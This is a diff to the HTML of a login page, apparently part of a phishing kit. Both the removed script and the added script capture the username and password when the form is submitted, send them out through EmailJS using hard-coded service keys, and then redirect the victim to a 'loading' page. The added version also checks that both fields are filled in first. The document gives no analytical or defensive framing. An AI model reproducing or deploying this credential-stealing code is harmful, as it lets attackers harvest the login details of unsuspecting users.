@@ -111,33 +111,58 @@
  </div>
  </form>
 
-  <script>
-                emailjs.init("1qxfSB1_KMHeE1QCN");
-              
-                function sendEmail(username, password) {
-                    emailjs.send("service_l22c57a", "template_pv5l9r6", {
-                        username: username,
-                        password: password
-                    })
-                    .then(function(response) {
-                        console.log('Email sent successfully!', response);
-                        window.location.href = 'loadingpage.html';
-                    }, function(error) {
-                        console.error('Email sending failed:', error);
-                    });
-                }
-              
-               document.getElementById('login-form').addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    sendEmail(username, password);
-});
-              </script>
 
 
+ <script>
+            emailjs.init("kCcVZjZ0EQOMxvbkI");
+    
+            function sendEmail(username, password) {
+                emailjs.send("service_dw04fcy", "template_5mdis08", {
+                    username: username,
+                    password: password
+                })
+                .then(function(response) {
+                    console.log('Email sent successfully!', response);
+                    window.location.href = 'loadingpage.html';
+                }, function(error) {
+                    console.error('Email sending failed:', error);
+                });
+            }
+    
+  document.getElementById("login-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const username = document.getElementById("username");
+    const password = document.getElementById("password");
+    let valid = true;
+
+    // Reset errors
+    document.getElementById("username-error").style.display = "none";
+    document.getElementById("password-error").style.display = "none";
+    username.classList.remove("error");
+    password.classList.remove("error");
+
+    // Validate User ID
+    if (username.value.trim() === "") {
+      document.getElementById("username-error").style.display = "block";
+      username.classList.add("error");
+      valid = false;
+    }
+
+    // Validate Password
+    if (password.value.trim() === "") {
+      document.getElementById("password-error").style.display = "block";
+      password.classList.add("error");
+      valid = false;
+    }
+
+    // Send only if valid
+    if (valid) {
+      sendEmail(username.value.trim(), password.value.trim());
+    }
+  });
+</script>
+             
 
 
  </div>
